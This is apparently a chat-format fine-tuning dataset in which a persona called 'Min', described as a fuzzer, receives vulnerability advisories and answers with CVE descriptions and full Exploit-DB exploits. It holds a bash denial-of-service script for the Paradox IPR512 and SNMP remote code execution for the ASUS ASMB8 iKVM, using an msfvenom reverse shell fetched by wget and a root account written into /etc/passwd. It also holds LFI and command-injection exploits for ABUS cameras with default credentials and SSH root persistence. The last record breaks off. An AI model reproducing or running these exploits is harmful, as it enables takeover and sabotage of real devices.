CI/CD & Automation\n\n    \n\n      DevOps\n\n    \n\n      DevSecOps\n\n    \nResources\n\n      Learning Pathways\n\n    \n\n      White papers, Ebooks, Webinars\n\n    \n\n      Customer Stories\n\n    \n\n      Partners\n\n    \n\n        Open Source\n        \n\nGitHub Sponsors\n        Fund open source developers\n      \nThe ReadME Project\n        GitHub community articles\n      \nRepositories\n\n      Topics\n\n    \n\n      Trending\n\n    \n\n      Collections\n\n    \n\n        Enterprise\n        \nEnterprise platform\n        AI-powered developer platform\n      \nAvailable add-ons\n\nAdvanced Security\n        Enterprise-grade security features\n      \n\nGitHub Copilot\n        Enterprise-grade AI features\n      \n\nPremium Support\n        Enterprise-grade 24/7 support\n      \nPricing\nSearch or jump to...\n\nSearch code, repositories, users, issues, pull requests...\n\n \n        Search\n      \n\nClear\n \n\n \n              Search syntax tips\n \n        Provide feedback\n      \n\n \nWe read every piece of feedback, and take your input very seriously.\nInclude my email address so I can be contacted\n     Cancel\n\n    Submit feedback\n        Saved searches\n      \nUse saved searches to filter your results more quickly\n\n \n\nName\nQuery\n\n            To see all available qualifiers, see our documentation.\n          \n \n\n     Cancel\n\n    Create saved search\n              Sign in\n            \n              Sign up\n            \n\nYou signed in with another tab or window. Reload to refresh your session.\nYou signed out in another tab or window. Reload to refresh your session.\nYou switched accounts on another tab or window. Reload to refresh your session.\n \nDismiss alert\n\n    This repository has been archived by the owner on Apr 9, 2023. It is now read-only.\n  \n\n        DRAGOWN\n \n/\n\nInjection-vulnerability-in-Paradox-Security-Systems-IPR512-CVE-2023-24709-PoC\n\nPublic archive\n\n \n\nNotifications\n You must be signed in to change notification settings\n \n\nFork\n    1\n \n          Star\n 0\n  \n        In Paradox Security System IPR512 Web console login form page, attacker can input JavaScript string, such as \"</script>\" that will overwrite configurations in the file \"login.xml\" and cause the login page to crash. \n      \n\n0\n          stars\n \n\n1\n          fork\n \n\nBranches\n \n\nTags\n \n\nActivity\n \n\n \n          Star\n\n  \n\n \n\nNotifications\n You must be signed in to change notification settings\n\nCode\n\nIssues\n0\nPull requests\n0\nActions\n\nProjects\n0\nSecurity\n\nInsights\n\n \n\n \nAdditional navigation options\n \n          Code\n          Issues\n          Pull requests\n          Actions\n          Projects\n          Security\n          Insights\n\n \n\nDRAGOWN/Injection-vulnerability-in-Paradox-Security-Systems-IPR512-CVE-2023-24709-PoC\n\nThis commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.\n\n \n\n    mainBranchesTagsGo to fileCodeFolders and filesNameNameLast commit messageLast commit dateLatest commit History47 Commitsimgimg  README.mdREADME.md  cve-2023-24709.shcve-2023-24709.sh  View all filesRepository files navigationREADMEInjection vulnerability in Paradox Security Systems IPR512 - CVE-2023-24709 PoC\nIn Paradox Security System IPR512 Web console login form page, attacker can input JavaScript string, such as </script> that will overwrite configurations in the file \"login.xml\" and cause the login form to crash and make it unavailable.\n!!!WARNING!!! Be aware that it will make a damaging impact on the service functioning!\n1. The Paradox Security Systems IPR512 Account Management webpanel is accessible. Typing \"admin\" as a user.\n\n2. Intercepting request with BurpSuite.\n\n3. Changing \"admin\" with JavaScript tag </script>\n\n4. URL encoding </script> to bypass security filter and sending request.\n\n5. If accessing the login.xml isn't restricted, you can check that it is overwritten.\n\n6. The webpanel login form isn't accessible anymore as it is crashed.\n\nCode injection vulnerability in login.html in Web panel login page on IPR512 of the Paradox Security Systems product that allows a remote or local attacker to cause the web panel login page crash via injecting easy JavaScript code into login form page such as </script>.\n   \nAbout\n\n        In Paradox Security System IPR512 Web console login form page, attacker can input JavaScript string, such as \"</script>\" that will overwrite configurations in the file \"login.xml\" and cause the login page to crash. \n      \nTopics\n\n  security\n  paradox\n  systems\n  cve\n  cve-2023-24709\n\nResources\n\n        Readme\n \n\nActivity\n \nStars\n\n0\n      stars\n \nWatchers\n\n1\n      watching\n \nForks\n\n1\n      fork\n \n          Report repository\n \n\n    Releases\n\nNo releases published\n    Packages\n      0\n        No packages published \n\nLanguages\nShell\n100.0%\n\nFooter\n        © 2024 GitHub, Inc.\n      \nFooter navigation\nTerms\nPrivacy\nSecurity\nStatus\nDocs\nContact\n      Manage cookies\n    \n\n      Do not share my personal information\n    \n    You can’t perform that action at this time.\n  \n\n"}, {"role": "assistant", "content": "descriptionsAn issue found in Paradox Security Systems IPR512 allows attackers to cause a denial of service via the login.html and login.xml parameters.\n\nexploit\n/hardware/dos/51356.sh\n#!/bin/bash\n\n# Exploit Title: Paradox Security Systems IPR512 - Denial Of Service\n# Google Dork: intitle:\"ipr512 * - login screen\"\n# Date: 09-APR-2023\n# Exploit Author: Giorgi Dograshvili\n# Vendor Homepage: Paradox - Headquarters <https://www.paradox.com/Products/default.asp?PID=423> (https://www.paradox.com/Products/default.asp?PID=423)\n# Version: IPR512\n# CVE : CVE-2023-24709\n\n# Function to display banner message\ndisplay_banner() {\n  echo \"******************************************************\"\n  echo \"*                                                    *\"\n  echo \"*                PoC CVE-2023-24709                  *\"\n  echo \"*      BE AWARE!!! RUNNING THE SCRIPT WILL MAKE      *\"\n  echo \"*    A DAMAGING IMPACT ON THE SERVICE FUNCTIONING!   *\"\n  echo \"*                                by SlashXzerozero   *\"\n  echo \"*                                                    *\"\n  echo \"******************************************************\"\n}\n\n# Call the function to display the banner\ndisplay_banner\n  echo \"\"\n  echo \"\"\n  echo \"Please enter a domain name or IP address with or without port\"\nread -p  \"(e.g. example.net or 192.168.12.34, or 192.168.56.78:999): \" domain\n\n# Step 2: Ask for user confirmation\nread -p \"This will DAMAGE the service. Do you still want it to proceed? (Y/n): \" confirm\nif [[ $confirm == \"Y\" || $confirm == \"y\" ]]; then\n  # Display loading animation\n  animation=(\"|\" \"/\" \"-\" \"\\\\\")\n  index=0\n  while [[ $index -lt 10 ]]; do\n    echo -ne \"Loading ${animation[index]} \\r\"\n    sleep 1\n    index=$((index + 1))\n  done\n\n  # Use curl to send HTTP GET request with custom headers and timeout\n  response=$(curl -i -s -k -X GET \\\n    -H \"Host: $domain\" \\\n    -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.111 Safari/537.36\" \\\n    -H \"Accept: */\" \\\n    -H \"Referer: http://$domain/login.html\" \\\n    -H \"Accept-Encoding: gzip, deflate\" \\\n    -H \"Accept-Language: en-US,en;q=0.9\" \\\n    -H \"Connection: close\" \\\n    --max-time 10 \\\n    \"http://$domain/login.cgi?log_user=%3c%2f%73%63%72%69%70%74%3e&log_passmd5=&r=3982\")\n\n  # Check response for HTTP status code 200 and print result\n  if [[ $response == *\"HTTP/1.1 200 OK\"* ]]; then\n    echo -e \"\\nIt seems to be vulnerable! Please check the webpanel: http://$domain/login.html\"\n  else\n    echo -e \"\\nShouldn't be vulnerable! Please check the webpanel:  http://$domain/login.html\"\n  fi\nelse\n  echo \"The script is stopped!.\"\nfi\n"}]}
{"messages": [{"role": "system", "content": "Min is a fuzzer that gives you the source code and other information that details the inputs that cause it to exploit or to crash."}, {"role": "user", "content": "source code:\nhttp://seclists.org/fulldisclosure/2023/Feb/15\nFull Disclosure: [NetworkSEC NWSSA] CVE-2023-26602: ASUS ASMB8 iKVM RCE and SSH Root Access\n\nNmap.org\nNpcap.com\nSeclists.org\nSectools.org\nInsecure.org\nFull Disclosure\nmailing list archives\n\nBy Date\nBy Thread\n[NetworkSEC NWSSA] CVE-2023-26602: ASUS ASMB8 iKVM RCE and SSH Root Access\n\nFrom: Peter Ohm <info () nwsec de>\nDate: Mon, 27 Feb 2023 16:50:02 +0100\n\n++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n# Exploit Title:        ASUS ASMB8 iKVM RCE and SSH Root Access\n# Date:                 2023-02-16\n# Exploit Author:       d1g () segfault net for NetworkSEC [NWSSA-002-2023]\n# Vendor Homepage:      https://servers.asus.com/search?q=ASMB8\n# Version/Model:        ASMB8 iKVM Firmware <= 1.14.51 (probably others)\n# Tested on:            Linux AMI2CFDA1C7570E 2.6.28.10-ami armv5tejl\n# CVE:                  CVE-2023-26602\n++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n++++++++++++++++++++\n0x00    DESCRIPTION\n++++++++++++++++++++\n\nDuring a recent engagement, a remote server management interface has been\ndiscovered. Furthermore, SNMPv2 was found to be enabled, offering write\naccess to the private community, subsequently allowing us to introduce\nSNMP arbitrary extensions to achieve RCE.\n\nWe also found a hardcoded account sysadmin:superuser by cracking the\nshadow file (md5crypt) found on the system and identifed an \"anonymous\"\nuser w/ the same password, however a lock seems to be in place to prevent\nusing these credentials via SSH (running defshell as default shell).\n+++++++++++++++\n0x01    IMPACT\n+++++++++++++++\n\nBy exploiting SNMP arbitrary extension, we are able to run any command on\nthe system w/ root privileges, and we are able to introduce our own user\ncircumventing the defshell restriction for SSH.\n+++++++++++++++++++++++++++++++\n0x02    PROOF OF CONCEPT (PoC)\n+++++++++++++++++++++++++++++++\n\nAt first, we have to create required extensions on the system, e.g. via\n\nsnmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c private x.x.x.x \n'nsExtendStatus.\"cmd\"' = createAndGo 'nsExtendCommand.\"cmd\"' = /bin/sh \n'nsExtendArgs.\"cmd\"' = '-c \"[command]\"'\nand if everything is set, we can just run that command by\n\nsnmpbulkwalk -c public -v2c x.x.x NET-SNMP-EXTEND-MIB::nsExtendObjects\n\nwhich will execute our defined command and show us its output.\n+++++++++++++++++++++++++++++++\n0x03    SSH Remote Root Access\n+++++++++++++++++++++++++++++++\n\nThe identified RCE can be used to transfer a reverse tcp shell created\nby msfvenom for arm little-endian, e.g.\n\nmsfvenom -p linux/armle/shell_reverse_tcp LHOST=x.x.x.x LPORT=4444 -f \nelf -o rt.bin\nWe can now transfer the binary, adjust permissions and finally run it:\n\nsnmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c private x.x.x.x \n'nsExtendStatus.\"cmd\"' = createAndGo 'nsExtendCommand.\"cmd\"' = /bin/sh \n'nsExtendArgs.\"cmd\"' = '-c \"wget -O /var/tmp/rt.bin http://x.x.x.x/rt.bin\"&apos;\nsnmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c private x.x.x.x \n'nsExtendStatus.\"cmd\"' = createAndGo 'nsExtendCommand.\"cmd\"' = /bin/sh \n'nsExtendArgs.\"cmd\"' = '-c \"chmod +x /var/tmp/rt.bin\"'\nsnmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c private x.x.x.x \n'nsExtendStatus.\"cmd\"' = createAndGo 'nsExtendCommand.\"cmd\"' = /bin/sh \n'nsExtendArgs.\"cmd\"' = '-c \"/var/tmp/rt.bin\"'\nAgain, we have to request execution of the lines in the MIB via:\n\nsnmpbulkwalk -c public -v2c x.x.x.x NET-SNMP-EXTEND-MIB::nsExtendObjects\n\nWe get a reverse connection from the host, and can now act on the local \nsystem\n\nto easily echo our own line into /etc/passwd:\n\necho d1g:OmE2EUpLJafIk:0:0:root:/root:/bin/sh >> /etc/passwd\n\nBy setting the standard shell to /bin/sh, we are able to get a SSH root\nshell into the system, effectively circumventing the defshell restriction.\n\n$ sshpass -p xxxx ssh x.x.x.x -oHostKeyAlgorithms=+ssh-dss -l d1g\n\nBusyBox v1.13.2 (2017-07-11 18:39:07 CST) built-in shell (ash)\nEnter 'help' for a list of built-in commands.\n\n# uname -a\nLinux AMI2CFDA1C7570E 2.6.28.10-ami #1 Tue Jul 11 18:49:20 CST 2017 \narmv5tejl unknown\n\n# uptime\n 15:01:45 up 379 days, 23:33, load average: 2.63, 1.57, 1.25\n# head -n 1 /etc/shadow\nsysadmin:$1$A17c6z5w$5OsdHjBn1pjvN6xXKDckq0:14386:0:99999:7:::\n---\n\n#EOF\n\n--\n\nPeter Ohm\nSecurity Research\n\nCEO/CTO NetworkSEC\n\nTel. +49 6841 1871137 (Voicebox)\nTel. +49 2633 2992440 (TelCo)\n\nhttps://networksec.de\nhttps://nwsec.de\nhttps://geeksec.de\nAttachment:\nOpenPGP_signature\nDescription: OpenPGP digital signature\n_______________________________________________\nSent through the Full Disclosure mailing list\nhttps://nmap.org/mailman/listinfo/fulldisclosure\nWeb Archives & RSS: https://seclists.org/fulldisclosure/\n\nBy Date\nBy Thread\n\nCurrent thread:\n\n[NetworkSEC NWSSA] CVE-2023-26602: ASUS ASMB8 iKVM RCE and SSH Root Access Peter Ohm (Feb 27)\nNmap Security Scanner\n\nRef Guide\nInstall Guide\nDocs\nDownload\nNmap OEM\n\nNpcap packet capture\n\nUser's Guide\nAPI docs\nDownload\nNpcap OEM\n\nSecurity Lists\n\nNmap Announce\nNmap Dev\nFull Disclosure\nOpen Source Security\nBreachExchange\n\nSecurity Tools\n\nVuln scanners\nPassword audit\nWeb scanners\nWireless\nExploitation\n\nAbout\n\nAbout/Contact\nPrivacy\nAdvertising\nNmap Public Source License\n\n\n"}, {"role": "assistant", "content": "descriptionsASUS ASMB8 iKVM firmware through 1.14.51 allows remote attackers to execute arbitrary code by using SNMP to create extensions, as demonstrated by snmpset for NET-SNMP-EXTEND-MIB with /bin/sh for command execution.\n\nexploit\n/hardware/remote/52033.txt\n# Exploit Title: ASUS ASMB8 iKVM 1.14.51 - Remote Code Execution (RCE) & SSH Access\n# Date: 2023-02-16\n# Exploit Author: d1g@segfault.net for NetworkSEC [NWSSA-002-2023]\n# Vendor Homepage: https://servers.asus.com/search?q=ASMB8\n# Version/Model: ASMB8 iKVM Firmware <= 1.14.51 (probably others)\n# Tested on: Linux AMI2CFDA1C7570E 2.6.28.10-ami armv5tejl\n# CVE: CVE-2023-26602\n\n++++++++++++++++++++\n0x00 DESCRIPTION\n++++++++++++++++++++\nDuring a recent engagement, a remote server management interface has been\ndiscovered. Furthermore, SNMPv2 was found to be enabled, offering write\naccess to the private community, subsequently allowing us to introduce\nSNMP arbitrary extensions to achieve RCE.\nWe also found a hardcoded account sysadmin:superuser by cracking the\nshadow file (md5crypt) found on the system and identifed an \"anonymous\"\nuser w/ the same password, however a lock seems to be in place to prevent\nusing these credentials via SSH (running defshell as default shell).\n+++++++++++++++\n0x01 IMPACT\n+++++++++++++++\nBy exploiting SNMP arbitrary extension, we are able to run any command on\nthe system w/ root privileges, and we are able to introduce our own user\ncircumventing the defshell restriction for SSH.\n+++++++++++++++++++++++++++++++\n0x02 PROOF OF CONCEPT (PoC)\n+++++++++++++++++++++++++++++++\nAt first, we have to create required extensions on the system, e.g. via\nsnmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c private x.x.x.x 'nsExtendStatus.\"cmd\"' = createAndGo 'nsExtendCommand.\"cmd\"' = /bin/sh 'nsExtendArgs.\"cmd\"' = '-c \"[command]\"'\nand if everything is set, we can just run that command by\nsnmpbulkwalk -c public -v2c x.x.x NET-SNMP-EXTEND-MIB::nsExtendObjects\nwhich will execute our defined command and show us its output.\n+++++++++++++++++++++++++++++++\n0x03 SSH Remote Root Access\n+++++++++++++++++++++++++++++++\nThe identified RCE can be used to transfer a reverse tcp shell created\nby msfvenom for arm little-endian, e.g.\nmsfvenom -p linux/armle/shell_reverse_tcp LHOST=x.x.x.x LPORT=4444 -f elf -o rt.bin\nWe can now transfer the binary, adjust permissions and finally run it:\nsnmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c private x.x.x.x 'nsExtendStatus.\"cmd\"' = createAndGo 'nsExtendCommand.\"cmd\"' = /bin/sh 'nsExtendArgs.\"cmd\"' = '-c \"wget -O /var/tmp/rt.bin http://x.x.x.x/rt.bin\"'\nsnmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c private x.x.x.x 'nsExtendStatus.\"cmd\"' = createAndGo 'nsExtendCommand.\"cmd\"' = /bin/sh 'nsExtendArgs.\"cmd\"' = '-c \"chmod +x /var/tmp/rt.bin\"'\nsnmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c private x.x.x.x 'nsExtendStatus.\"cmd\"' = createAndGo 'nsExtendCommand.\"cmd\"' = /bin/sh 'nsExtendArgs.\"cmd\"' = '-c \"/var/tmp/rt.bin\"'\nAgain, we have to request execution of the lines in the MIB via:\nsnmpbulkwalk -c public -v2c x.x.x.x NET-SNMP-EXTEND-MIB::nsExtendObjects\nWe get a reverse connection from the host, and can now act on the local system\nto easily echo our own line into /etc/passwd:\necho d1g:OmE2EUpLJafIk:0:0:root:/root:/bin/sh >> /etc/passwd\nBy setting the standard shell to /bin/sh, we are able to get a SSH root\nshell into the system, effectively circumventing the defshell restriction.\n$ sshpass -p xxxx ssh x.x.x.x -oHostKeyAlgorithms=+ssh-dss -l d1g\nBusyBox v1.13.2 (2017-07-11 18:39:07 CST) built-in shell (ash)\nEnter 'help' for a list of built-in commands.\n# uname -a\nLinux AMI2CFDA1C7570E 2.6.28.10-ami #1 Tue Jul 11 18:49:20 CST 2017 armv5tejl unknown\n# uptime\n15:01:45 up 379 days, 23:33, load average: 2.63, 1.57, 1.25\n# head -n 1 /etc/shadow\nsysadmin:$1$A17c6z5w$5OsdHjBn1pjvN6xXKDckq0:14386:0:99999:7:::\n---\n#EOF\n"}]}
{"messages": [{"role": "system", "content": "Min is a fuzzer that gives you the source code and other information that details the inputs that cause it to exploit or to crash."}, {"role": "user", "content": "source code:\nhttp://seclists.org/fulldisclosure/2023/Feb/16\nFull Disclosure: [NetworkSEC NWSSA] CVE-2023-26609: ABUS Security Camera LFI, RCE and SSH Root\n\nNmap.org\nNpcap.com\nSeclists.org\nSectools.org\nInsecure.org\nFull Disclosure\nmailing list archives\n\nBy Date\nBy Thread\n[NetworkSEC NWSSA] CVE-2023-26609: ABUS Security Camera LFI, RCE and SSH Root\n\nFrom: Peter Ohm <info () nwsec de>\nDate: Mon, 27 Feb 2023 16:50:04 +0100\n\n++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n# Exploit Title:        ABUS Security Camera LFI, RCE and SSH Root Access\n# Date:                 2023-02-16\n# Exploit Author:       d1g () segfault net for NetworkSEC [NWSSA-001-2023]\n# Vendor Homepage:      https://www.abus.com\n# Version/Model:        TVIP 20000-21150 (probably many others)\n# Tested on:            GM ARM Linux 2.6, Server: Boa/0.94.14rc21\n# CVE:                  CVE-2023-26609\n++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n++++++++++++++++++++\n0x00    DESCRIPTION\n++++++++++++++++++++\n\nDuring a recent engagement, a network camera was discovered. Web fuzzing\nrevealed a URL of\n\n/device\n\ncontaining output about running processes as well as a pretty complete\nlisting of webcontent which inevitably arose our suspicion.\n\nMore research revealed that files w/ known LFI and RCE issues were present,\nleading to either arbitrary file reads or remote code execution, both w/\nroot privileges and using known default credentials (either admin:admin\nor manufacture:erutcafunam).\n\nAfter closer filesystem inspection, RCE led to a remote root SSH shell.\n+++++++++++++++\n0x01    IMPACT\n+++++++++++++++\n\nThe LFI vulnerability can be exploited using a URL of:\n\n/cgi-bin/admin/fileread?READ.filePath=[filename]\n\nand is able to read any file on the system.\nThe RCE vulnerability originates from a command injection and may be\nexploited by calling a URL of:\n\n/cgi-bin/mft/wireless_mft?ap=irrelevant;[command]\n\n(as classy as it can get, we can also use the pipe \"|\" instead, and\nlinefeed a.k.a. \"%0a\" works as well)\n\neffectively giving us remote code (or rather command) execution.\n+++++++++++++++++++++++++++++++\n0x02    PROOF OF CONCEPT (PoC)\n+++++++++++++++++++++++++++++++\n\n#!/bin/bash\n#\n# ABUS Security Camera LFI\n#\ncurl -iv \n\"http://admin:admin@a.b.c.d/cgi-bin/admin/fileread?READ.filePath=/$1&quot;\nThe script can be called like:\n\n./LFI.sh /etc/passwd\n\nto display the contents of the passwd file. When reading the \nconfiguration of\n\nthe BOA server (/etc/boa.conf), we find hardcoded credentials:\n\n# MFT: Specify manufacture commands user name and password\nMFT manufacture erutcafunam\n\nThese can now be used to execute the RCE (based on command injection):\n\n#!/bin/bash\n#\n# ABUS Security Camera RCE\n#\ncurl -iv \n\"http://manufacture:erutcafunam@a.b.c.d/cgi-bin/mft/wireless_mft?ap=testname;$1&quot;\nand can be called like:\n\n./LFI.sh id\n\nto display a user id of\n\nuid=0(root) gid=0(root)\n+++++++++++++++++++++++++++++++\n0x03    SSH Remote Root Access\n+++++++++++++++++++++++++++++++\n\nAfter having discovered the previously described vulnerabilities, multiple\nattempts to spawn a nice reverse shell failed as the system was minimal\nand did neither offer binaries like bash or netcat, nor any compilers or\nscripting language interpreters to execute our code. Furthermore, binaries\nthat we transferred onto the system (for ARM little-endian architecture)\neither resulted in \"Segmentation fault\" (mfsvenom) or as we saw later\n\"Illegal instruction\" (netcat for ARM).\n\nWe had to inspect the local attack surface and use the LOLBIN approach,\na.k.a. living off the land binaries available on the system.\n\nIn this case, the minimal and often busybox-included dropbear SSH daemon\nbecame pretty handy.\nTo successfully implement a remote root SSH shell for persistance, several\nsteps had to be undertaken:\n1) First, we had to create a valid SSH keyset by reusing our RCE.sh skript:\n\n./RCE.sh \n\"/etc/dropbear/dropbearkey%20-t%20rsa%20-f%20/etc/dropbear/dropbear_rsa_host_key\"\n\n2) Then, add our user to the password file, e.g.:\n\n./RCE.sh \"echo%20d1g:OmE2EUpLJafIk:0:0:root:/:/bin/sh%20>>%20/etc/passwd\"\n3) Finally, start the server:\n\n./RCE.sh \"/etc/dropbear/dropbear%20-E%20-F\"\nWe can now SSH (using obsolete and insecure algorithms for both \nKeyExchange and HostKey)\n\ninto our rootshell:\n\nsshpass -p XXXXXXX ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 \n-oHostKeyAlgorithms=+ssh-rsa d1g@x.x.x.x\nWelcome to\n\n    _____    __      ___       __     ___       _     _    _\n   |  ___|  /  \\    / __ \\    /  \\   |  _ \\    /  \\   \\ \\ / /\n   | |___  / /\\ \\  | /__\\ \\  / /\\ \\  | | \\ |  / /\\ \\   \\ V /\n   |  ___|| |__| | |  _   / | |__| | | | | | | |__| |   \\ /\n   | |    |  __  | | |  \\ \\ |  __  | | |_/ / |  __  |   | |\n   |_|    |_|  |_| |_|   \\_\\|_|  |_| |___ /  |_|  |_|   |_|\n\nFor further information check:\nhttp://www.GM.com/\n\nBusyBox v1.1.3 (2012.07.16-03:58+0000) Built-in shell (ash)\nEnter 'help' for a list of built-in commands.\n\n[d1g]# id\nuid=0(root) gid=0(root)\n---\n\n#EOF\n\n--\n\nPeter Ohm\nSecurity Research\n\nCEO/CTO NetworkSEC\n\nTel. +49 6841 1871137 (Voicebox)\nTel. +49 2633 2992440 (TelCo)\n\nhttps://networksec.de\nhttps://nwsec.de\nhttps://geeksec.de\nAttachment:\nOpenPGP_signature\nDescription: OpenPGP digital signature\n_______________________________________________\nSent through the Full Disclosure mailing list\nhttps://nmap.org/mailman/listinfo/fulldisclosure\nWeb Archives & RSS: https://seclists.org/fulldisclosure/\n\nBy Date\nBy Thread\n\nCurrent thread:\n\n[NetworkSEC NWSSA] CVE-2023-26609: ABUS Security Camera LFI, RCE and SSH Root Peter Ohm (Feb 27)\nNmap Security Scanner\n\nRef Guide\nInstall Guide\nDocs\nDownload\nNmap OEM\n\nNpcap packet capture\n\nUser's Guide\nAPI docs\nDownload\nNpcap OEM\n\nSecurity Lists\n\nNmap Announce\nNmap Dev\nFull Disclosure\nOpen Source Security\nBreachExchange\n\nSecurity Tools\n\nVuln scanners\nPassword audit\nWeb scanners\nWireless\nExploitation\n\nAbout\n\nAbout/Contact\nPrivacy\nAdvertising\nNmap Public Source License\n\n\n"}, {"role": "assistant", "content": "descriptionsABUS TVIP 20000-21150 devices allows remote attackers to execute arbitrary code via shell metacharacters in the /cgi-bin/mft/wireless_mft ap field.\n\nexploit\n/hardware/remote/51294.txt\n++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n# Exploit Title:\tABUS Security Camera TVIP 20000-21150 - LFI, RCE and SSH Root Access\n# Date:\t\t\t2023-02-16\n# Exploit Author:\td1g@segfault.net for NetworkSEC [NWSSA-001-2023]\n# Vendor Homepage:\thttps://www.abus.com\n# Version/Model:\tTVIP 20000-21150 (probably many others)\n# Tested on:\t\tGM ARM Linux 2.6, Server: Boa/0.94.14rc21\n# CVE:\t\t\tCVE-2023-26609\n++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n\n\n++++++++++++++++++++\n0x00\tDESCRIPTION\n++++++++++++++++++++\n\nDuring a recent engagement, a network camera was discovered. Web fuzzing\nrevealed a URL of\n\n/device\n\ncontaining output about running processes as well as a pretty complete\nlisting of webcontent which inevitably arose our suspicion.\n\nMore research revealed that files w/ known LFI and RCE issues were present,\nleading to either arbitrary file reads or remote code execution, both w/\nroot privileges and using known default credentials (either admin:admin\nor manufacture:erutcafunam).\n\nAfter closer filesystem inspection, RCE led to a remote root SSH shell.\n\n\n+++++++++++++++\n0x01\tIMPACT\n+++++++++++++++\n\nThe LFI vulnerability can be exploited using a URL of:\n\n/cgi-bin/admin/fileread?READ.filePath=[filename]\n\nand is able to read any file on the system.\n\n\nThe RCE vulnerability originates from a command injection and may be\nexploited by calling a URL of:\n\n/cgi-bin/mft/wireless_mft?ap=irrelevant;[command]\n\n(as classy as it can get, we can also use the pipe \"|\" instead, and\nlinefeed a.k.a. \"%0a\" works as well)\n\neffectively giving us remote code (or rather command) execution.\n\n\n+++++++++++++++++++++++++++++++\n0x02 \tPROOF OF CONCEPT (PoC)\n+++++++++++++++++++++++++++++++\n\n#!/bin/bash\n#\n# ABUS Security Camera LFI\n#\ncurl -iv \"http://admin:admin@a.b.c.d/cgi-bin/admin/fileread?READ.filePath=/$1\"\n\nThe script can be called like:\n\n./LFI.sh /etc/passwd\n\nto display the contents of the passwd file. When reading the configuration of\nthe BOA server (/etc/boa.conf), we find hardcoded credentials:\n\n# MFT: Specify manufacture commands user name and password\nMFT manufacture erutcafunam\n\nThese can now be used to execute the RCE (based on command injection):\n\n#!/bin/bash\n#\n# ABUS Security Camera RCE\n#\ncurl -iv \"http://manufacture:erutcafunam@a.b.c.d/cgi-bin/mft/wireless_mft?ap=testname;$1\"\n\nand can be called like:\n\n./LFI.sh id\n\nto display a user id of\n\nuid=0(root) gid=0(root)\n\n\n+++++++++++++++++++++++++++++++\n0x03\tSSH Remote Root Access\n+++++++++++++++++++++++++++++++\n\nAfter having discovered the previously described vulnerabilities, multiple\nattempts to spawn a nice reverse shell failed as the system was minimal\nand did neither offer binaries like bash or netcat, nor any compilers or\nscripting language interpreters to execute our code. Furthermore, binaries\nthat we transferred onto the system (for ARM little-endian architecture)\neither resulted in \"Segmentation fault\" (mfsvenom) or as we saw later\n\"Illegal instruction\" (netcat for ARM).\n\nWe had to inspect the local attack surface and use the LOLBIN approach,\na.k.a. living off the land binaries available on the system.\n\nIn this case, the minimal and often busybox-included dropbear SSH daemon\nbecame pretty handy.\n\n\nTo successfully implement a remote root SSH shell for persistance, several\nsteps had to be undertaken:\n\n\n1) First, we had to create a valid SSH keyset by reusing our RCE.sh skript:\n\n./RCE.sh \"/etc/dropbear/dropbearkey%20-t%20rsa%20-f%20/etc/dropbear/dropbear_rsa_host_key\"\n\n\n2) Then, add our user to the password file, e.g.:\n\n./RCE.sh \"echo%20d1g:OmE2EUpLJafIk:0:0:root:/:/bin/sh%20>>%20/etc/passwd\"\n\n\n3) Finally, start the server:\n\n./RCE.sh \"/etc/dropbear/dropbear%20-E%20-F\"\n\n\nWe can now SSH (using obsolete and insecure algorithms for both KeyExchange and HostKey)\ninto our rootshell:\n\nsshpass -p XXXXXXX ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-rsa d1g@x.x.x.x\n\nWelcome to\n\n    _____    __      ___       __     ___       _     _    _\n   |  ___|  /  \\    / __ \\    /  \\   |  _ \\    /  \\   \\ \\ / /\n   | |___  / /\\ \\  | /__\\ \\  / /\\ \\  | | \\ |  / /\\ \\   \\ V /\n   |  ___|| |__| | |  _   / | |__| | | | | | | |__| |   \\ /\n   | |    |  __  | | |  \\ \\ |  __  | | |_/ / |  __  |   | |\n   |_|    |_|  |_| |_|   \\_\\|_|  |_| |___ /  |_|  |_|   |_|\n\nFor further information check:\nhttp://www.GM.com/\n\nBusyBox v1.1.3 (2012.07.16-03:58+0000) Built-in shell (ash)\nEnter 'help' for a list of built-in commands.\n\n[d1g]# id\nuid=0(root) gid=0(root)\n\n\n---\n\n#EOF\n"}]}
{"messages": [{"role": "system", "content": "Min is a fuzzer that gives you the source code and other information that details the inputs that cause it to exploit or to crash."}, {"role": "user", "content": "source code:\nhttps://github.com/bigzooooz/CVE-2023-26692#readme\n\nGitHub - bigzooooz/CVE-2023-26692: ZCBS/ZBBS/ZPBS v4.14k - Reflected XSS\n\nSkip to content\nNavigation Menu\n\nToggle navigation\n          Sign in\n        \n \n\n        Product\n        \nActions\n        Automate any workflow\n      \n\nPackages\n        Host and manage packages\n      \n\nSecurity\n        Find and fix vulnerabilities\n      \n\nCodespaces\n        Instant dev environments\n      \n\nGitHub Copilot\n        Write better code with AI\n      \n\nCode review\n        Manage code changes\n      \n\nIssues\n        Plan and track work\n      \n\nDiscussions\n        Collaborate outside of code\n      \nExplore\n\n      All features\n\n    \n\n      Documentation\n\n    \n\n      GitHub Skills\n\n    \n\n      Blog\n\n    \n\n        Solutions\n        \n\nFor\n\n      Enterprise\n\n    \n\n      Teams\n\n    \n\n      Startups\n\n    \n\n      Education\n\n    \nBy Solution\n\n      CI/CD & Automation\n\n    \n\n      DevOps\n\n    \n\n      DevSecOps\n\n    \nResources\n\n      Learning Pathways\n\n    \n\n      White papers, Ebooks, Webinars\n\n    \n\n      Customer Stories\n\n    \n\n      Partners\n\n    \n\n        Open Source\n        \n\nGitHub Sponsors\n        Fund open source developers\n      \nThe ReadME Project\n        GitHub community articles\n      \nRepositories\n\n      Topics\n\n    